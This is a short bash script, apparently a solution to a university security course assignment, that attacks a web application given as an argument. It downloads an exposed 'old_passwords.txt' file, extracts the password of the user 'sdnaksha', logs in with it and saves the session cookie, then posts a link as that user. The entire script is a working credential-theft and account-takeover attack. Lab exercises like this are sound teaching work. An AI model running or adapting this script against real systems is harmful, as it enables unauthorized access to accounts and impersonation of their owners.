#!/bin/bash
url=$1;
USER=sdnaksha

echo "Download old_passwords.txt";
OUTPUT=$(curl "${url}/docs/old_passwords.txt" 2>/dev/null | grep ${USER})
echo -n "Getting password for user '${USER}'... "
PASSWORD=$(echo ${OUTPUT} | cut -d' ' -f2)

echo "Logged in as sdnaksha"
curl -c cookies.txt -d "username=${USER}&password=${PASSWORD}&form=login&submit=Login" "$url/post.php";
echo "Post a new link..."
curl -b cookies.txt -d "title=This is a fun assignment! &content=https://crysp.uwaterloo.ca/courses/cs458/W17-material/assignments.html&type=2&form=content&submit=Post" "$url/post.php"
echo -e "\033[32mDone!\033[0m"
